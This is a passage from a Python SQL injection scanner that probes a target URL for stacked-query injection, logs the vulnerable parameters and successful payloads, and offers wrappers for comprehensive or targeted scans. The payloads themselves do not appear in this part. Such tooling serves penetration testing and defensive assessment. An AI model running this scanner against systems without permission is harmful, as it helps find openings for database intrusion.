        results['vulnerability_count'] = len(results['vulnerable_parameters'])
        
        self._generate_scan_summary(results)
        return results

    def _generate_scan_summary(self, scan_results: Dict[str, Any]):
        """Generate comprehensive scan summary."""
        self.logger.info("=" * 60)
        self.logger.info("STACKED QUERIES SQL INJECTION SCAN SUMMARY")
        self.logger.info(f"Target: {scan_results['target'].get('url')}")
        self.logger.info(f"Detection mode: {scan_results['detection_mode']}")
        self.logger.info(f"Detected databases: {', '.join(scan_results.get('detected_databases', []))}")
        self.logger.info(f"Parameters tested: {len(scan_results['parameters_tested'])}")
        self.logger.info(f"Vulnerabilities found: {scan_results['vulnerability_count']}")
        self.logger.info(f"Scan duration: {scan_results.get('scan_duration', 0):.2f}s")
        
        if scan_results['vulnerability_count'] > 0:
            self.logger.info("Vulnerable parameters:")
            for vuln in scan_results['vulnerable_parameters']:
                self.logger.info(f"  - {vuln['parameter']} (confidence: {vuln['confidence']:.3f})")
                self.logger.info(f"    Database: {vuln['database_type']}")
                for successful in vuln.get('successful_payloads', [])[:1]:
                    payload_type = successful.get('payload_type', 'unknown')
                    self.logger.info(f"    Type: {payload_type}, Payload: {successful['payload'][:60]}...")
        
        self.logger.info("=" * 60)

    def close(self):
        """Clean up resources."""
        self.http_session.close()

# Convenience functions
def run_stacked_queries_scan(target_config: Dict[str, Any], scan_type: str = 'comprehensive',
                           detector_config: Dict[str, Any] = None,
                           specific_databases: List[str] = None) -> Dict[str, Any]:
    """
    Run stacked queries SQL injection scan.
    
    Args:
        target_config: Target configuration
        scan_type: Type of scan ('comprehensive', 'targeted')
        detector_config: Detector configuration
        specific_databases: List of specific databases to test
    
    Returns:
        Scan results
    """
    detector = AdvancedStackedQueriesDetector(detector_config or {})
    
    try:
        if scan_type == 'comprehensive':
            return detector.comprehensive_scan(target_config)
        elif scan_type == 'targeted':
            return detector.targeted_scan(target_config, specific_databases)
        else:
            raise ValueError(f"Unknown scan type: {scan_type}")
    
    finally:
        detector.close()

def get_supported_databases():
    """Get databases that support stacked queries."""
    return {db: info for db, info in STACKED_SUPPORT.items() if info['enabled']}

def get_stacked_payload_types():
    """Get available stacked query payload types."""
    return list(STACKED_PAYLOADS.keys())

